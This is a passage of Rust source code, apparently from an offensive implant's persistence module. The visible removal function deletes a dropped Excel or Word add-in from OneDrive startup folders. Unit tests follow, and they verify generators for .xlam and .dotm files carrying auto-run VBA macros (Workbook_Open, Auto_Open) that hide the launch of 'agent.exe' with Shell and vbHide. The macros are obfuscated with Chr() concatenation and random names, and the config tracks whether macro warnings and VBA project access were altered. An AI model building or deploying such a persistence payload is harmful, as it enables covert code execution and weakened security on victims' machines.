            Ok(paths) => paths,
            Err(e) => {
                warn!("Could not discover OneDrive paths for removal: {}", e);
                return Ok(());
            }
        }
    };

    let target_dir = match config.addin_type {
        AddinType::Excel => &onedrive.xlstart,
        AddinType::Word => &onedrive.word_startup,
    };

    let extension = match config.addin_type {
        AddinType::Excel => "xlam",
        AddinType::Word => "dotm",
    };

    let filename = config
        .addin_filename
        .clone()
        .unwrap_or_else(|| format!("{}.{}", random_alphanum(DISC_FILENAME), extension));

    let addin_path = target_dir.join(&filename);

    if addin_path.exists() {
        std::fs::remove_file(&addin_path).with_context(|| {
            format!("failed to delete add-in: {}", addin_path.display())
        })?;
        info!("Removed add-in: {}", addin_path.display());
    } else {
        debug!("Add-in file already absent: {}", addin_path.display());
    }

    Ok(())
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_crc32_empty() {
        assert_eq!(crc32(&[]), 0x00000000);
    }

    #[test]
    fn test_crc32_hello() {
        // Known CRC32 for "hello".
        let expected = 0xF7D18982;
        assert_eq!(crc32(b"hello"), expected);
    }

    #[test]
    fn test_base64_encode_empty() {
        assert_eq!(base64_encode(&[]), "");
    }

    #[test]
    fn test_base64_encode_hello() {
        assert_eq!(base64_encode(b"Hello"), "SGVsbG8=");
    }

    #[test]
    fn test_base64_encode_bytes() {
        assert_eq!(base64_encode(b"any carnal pleasure."), "YW55IGNhcm5hbCBwbGVhc3VyZS4=");
    }

    #[test]
    fn test_string_to_chr_concat() {
        let result = string_to_chr_concat("AB");
        assert_eq!(result, "Chr(65) & Chr(66)");
    }

    #[test]
    fn test_generate_vba_payload() {
        let path = PathBuf::from(r"C:\test\agent.exe");
        let vba = generate_vba_payload(&path);
        assert!(vba.contains("Workbook_Open"));
        assert!(vba.contains("Auto_Open"));
        assert!(vba.contains("Shell"));
        assert!(vba.contains("vbHide"));
        assert!(vba.contains("Chr(67)")); // 'C' in path
    }

    #[test]
    fn test_zip_writer_basic() {
        let mut zip = ZipWriter::new();
        zip.add_file("test.txt", b"hello world");
        let data = zip.render();

        // Check ZIP signature.
        assert_eq!(&data[0..4], &[0x50, 0x4B, 0x03, 0x04]);
        // Check EOCD signature at end.
        assert!(data.len() >= 22);
        let eocd_offset = data.len() - 22;
        assert_eq!(&data[eocd_offset..eocd_offset + 4], &[0x50, 0x4B, 0x05, 0x06]);
    }

    #[test]
    fn test_zip_writer_multiple_files() {
        let mut zip = ZipWriter::new();
        zip.add_file("a.txt", b"aaa");
        zip.add_file("b/c.txt", b"ccc");
        let data = zip.render();

        assert_eq!(&data[0..4], &[0x50, 0x4B, 0x03, 0x04]);
        // Should contain both file entries.
        let a_pos = find_subsequence(&data, b"a.txt");
        let c_pos = find_subsequence(&data, b"b/c.txt");
        assert!(a_pos.is_some());
        assert!(c_pos.is_some());
    }

    #[test]
    fn test_zip_writer_crc32_consistency() {
        let mut zip = ZipWriter::new();
        zip.add_file("test.bin", &[0x01, 0x02, 0x03, 0x04]);
        let data = zip.render();

        // Verify CRC appears in both local header and central directory.
        let expected_crc = crc32(&[0x01, 0x02, 0x03, 0x04]);
        let crc_bytes = expected_crc.to_le_bytes();
        // CRC appears in local file header at offset 14.
        let local_crc = &data[14..18];
        assert_eq!(local_crc, crc_bytes);
    }

    #[test]
    fn test_ole2_magic() {
        assert_eq!(OLE2_MAGIC, [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
    }

    #[test]
    fn test_ole2_compound_file_basic() {
        let mut ole2 = Ole2CompoundFile::new();
        ole2.add_stream("test", b"hello");
        let data = ole2.render();

        // Check magic.
        assert!(data.len() >= 8);
        assert_eq!(&data[0..8], &OLE2_MAGIC);
        // Should be at least one sector (512 bytes).
        assert!(data.len() >= SECTOR_SIZE);
    }

    #[test]
    fn test_ole2_compound_file_multiple_streams() {
        let mut ole2 = Ole2CompoundFile::new();
        ole2.add_stream("stream1", b"aaaa");
        ole2.add_stream("stream2", b"bbbb");
        let data = ole2.render();

        assert_eq!(&data[0..8], &OLE2_MAGIC);
        assert!(data.len() >= SECTOR_SIZE * 2);
    }

    #[test]
    fn test_build_vba_project_header() {
        let header = build_vba_project_header();
        assert_eq!(header.len(), 16);
        // Check signature.
        assert_eq!(u32::from_le_bytes(header[0..4].try_into().unwrap()), 0x000061CC);
    }

    #[test]
    fn test_build_dir_stream() {
        let dir = build_dir_stream();
        assert!(!dir.is_empty());
        // Should start with SysKind record (id=0x0001).
        assert_eq!(u16::from_le_bytes(dir[0..2].try_into().unwrap()), 0x0001);
    }

    #[test]
    fn test_generate_xlam() {
        let path = PathBuf::from(r"C:\test\agent.exe");
        let data = generate_xlam(&path);

        // Should be a valid ZIP.
        assert_eq!(&data[0..4], &[0x50, 0x4B, 0x03, 0x04]);
        // Should contain vbaProject.bin.
        assert!(find_subsequence(&data, b"vbaProject.bin").is_some());
        // Should contain workbook.xml.
        assert!(find_subsequence(&data, b"workbook.xml").is_some());
    }

    #[test]
    fn test_generate_dotm() {
        let path = PathBuf::from(r"C:\test\agent.exe");
        let data = generate_dotm(&path);

        // Should be a valid ZIP.
        assert_eq!(&data[0..4], &[0x50, 0x4B, 0x03, 0x04]);
        // Should contain vbaProject.bin.
        assert!(find_subsequence(&data, b"vbaProject.bin").is_some());
        // Should contain document.xml.
        assert!(find_subsequence(&data, b"document.xml").is_some());
    }

    #[test]
    fn test_encode_entry_name() {
        let name = encode_entry_name("Root Entry");
        assert!(name.len() <= 31);
        assert_eq!(name.last(), Some(&0)); // null terminated
    }

    #[test]
    fn test_encode_entry_name_truncation() {
        let long_name = "A".repeat(50);
        let name = encode_entry_name(&long_name);
        assert!(name.len() <= 31);
    }

    #[test]
    fn test_random_vba_var() {
        let v = random_vba_var(42);
        assert!(!v.is_empty());
        // Must start with a letter.
        assert!(v.chars().next().unwrap().is_ascii_alphabetic());
    }

    #[test]
    fn test_random_vba_var_deterministic() {
        let v1 = random_vba_var(99);
        let v2 = random_vba_var(99);
        assert_eq!(v1, v2);
    }

    #[test]
    fn test_random_alphanum_deterministic() {
        let s1 = random_alphanum(DISC_FILENAME);
        let s2 = random_alphanum(DISC_FILENAME);
        assert_eq!(s1, s2);
    }

    #[test]
    fn test_addin_type_serialization() {
        let excel = AddinType::Excel;
        let json = serde_json::to_string(&excel).unwrap();
        assert_eq!(json, r#""Excel""#);

        let word = AddinType::Word;
        let json = serde_json::to_string(&word).unwrap();
        assert_eq!(json, r#""Word""#);
    }

    #[test]
    fn test_office_addin_config_serialization() {
        let config = OfficeAddinConfig {
            addin_type: AddinType::Excel,
            payload_path: PathBuf::from(r"C:\test\agent.exe"),
            onedrive_path: Some(PathBuf::from(r"C:\Users\test\OneDrive")),
            addin_filename: Some("test.xlam".to_string()),
        };
        let json = serde_json::to_string(&config).unwrap();
        let deserialized: OfficeAddinConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.addin_type, AddinType::Excel);
        assert_eq!(deserialized.payload_path, PathBuf::from(r"C:\test\agent.exe"));
    }

    #[test]
    fn test_addin_install_result_serialization() {
        let result = AddinInstallResult {
            addin_path: PathBuf::from(r"C:\Users\test\OneDrive\Documents\XLSTART\abc.xlam"),
            access_vbom_set: true,
            macro_warnings_set: false,
            addin_type: AddinType::Excel,
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("XLSTART"));
        assert!(json.contains("access_vbom_set"));
    }

    #[test]
    fn test_content_types_xml() {
        assert!(CONTENT_TYPES_XML.contains("content-types"));
        assert!(CONTENT_TYPES_XML.contains("vbaProject"));
    }

    #[test]
    fn test_rels_xml() {
        assert!(RELS_XML.contains("Relationships"));
        assert!(RELS_XML.contains("officeDocument"));
    }

    #[test]
    fn test_workbook_xml() {
        assert!(WORKBOOK_XML.contains("workbook"));
    }

    // ── Helper ──

    fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
        haystack
            .windows(needle.len())
            .position(|window| window == needle)
    }
}
